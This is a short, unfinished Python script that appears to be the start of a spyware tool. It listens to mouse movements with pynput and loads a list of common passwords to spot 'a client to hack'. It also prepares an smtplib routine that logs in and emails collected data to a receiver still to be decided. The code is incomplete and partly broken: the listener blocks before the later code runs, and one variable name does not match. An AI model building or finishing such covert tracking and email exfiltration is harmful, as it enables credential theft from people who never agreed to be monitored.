#imports
import smtplib #for sending mail
from pandas import * #for reading csv
from pynput import mouse #for mouse listener

def mouse_is_moving(x, y):  #when mouse is moving, track it
    print("The mouse position is changed to " + str(x)+" " + str(y)+".")

# Register the callback function
def start_mouse_listener(): # add the mouse listener tracking to listener
    with mouse.Listener(on_move=mouse_is_moving) as listener:
        listener.join()

start_mouse_listener()
#check if the string is in the password list , if so, then we found a client to hack
def isInMostCommonPasswords(foundPassword : str ,passwordsList : list): 
    if foundPassword in passwordList: 
        return True
    return False


#read the dataset and return a list storing the information : passwords in our case
def readDataset(datasetName : str):
    #read the CSV file
    dataset = read_csv(datasetName)
    #convert the dataset into a list
    passwords_as_list = dataset['password'].tolist()
    return passwords_as_list


#send email : paremeter is the server_address
def sendEmail(server_address : str = ""):
    server = smtplib.SMTP('smtp.example.com') #this line should be changed to server_address when we decide where to sent.
    server.login(email_username, email_password)
    server.sendmail(email_username, email_reciever, email_message)
    server.quit()



#store the most used words in a list, so that we dont need to keep reading the file. We don't need to keep opening and closing the file.
passwordList : str
#initialize email information
email_username = ""
email_password = ""
email_reciever = ""
email_server = ""
email_message = ""

#initialize dataset
datasetName = "common_passwords.csv"
passwordList = readDataset(datasetName)




#helper codes -------------------------------------------------------

# Connect to the Yahoo Mail server and send the email
#server example 
    # server = smtplib.SMTP('smtp.mail.yahoo.com', 587)

# server = smtplib.SMTP('smtp.example.com')
# server.login(email_username, email_password)
# server.sendmail(email_username, email_reciever, email_message)
# server.quit()


